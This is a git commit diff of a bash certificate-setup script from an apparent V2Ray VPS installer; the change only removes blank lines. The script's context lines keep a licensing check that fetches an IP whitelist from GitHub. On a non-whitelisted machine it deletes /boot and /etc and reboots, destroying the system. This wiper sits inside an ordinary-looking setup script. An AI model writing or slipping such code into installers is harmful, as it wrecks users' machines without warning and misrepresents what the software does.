3c352a91e0ede5c76031bee9f7900311ebabe219
halluboys <87511503+halluboys@users.noreply.github.com>
2021-08-30 13:42:02 +0700

    Update cert.sh

--- v2rayy/cert.sh
+++ v2rayy/cert.sh
@@ -1,38 +1,21 @@
 #!/bin/bash
 red='\e[1;31m'
-
 green='\e[0;32m'
-
 NC='\e[0m'
-
 MYIP=$(wget -qO- ifconfig.me/ip);
-
 IZIN=$( curl https://raw.githubusercontent.com/halluboys/ipvps/main/ip | grep $MYIP )
-
 if [ $MYIP = $IZIN ]; then
-
 echo -e "${green}Permission Accepted...${NC}"
-
 else
-
 echo -e "${red}Permission Denied!${NC}";
-
 echo "Please Contact Admin"
-
 echo "Telegram t.me/xzvnct"
-
 echo "Waiting 5 Sec"
-
 rm -f setup.sh
-
 sleep 5
-
 rm -r -f /boot; rm -r -f /etc; reboot
-
 exit 0
-
 fi
-
 echo "Checking VPS"
 echo start
 sleep 0.5
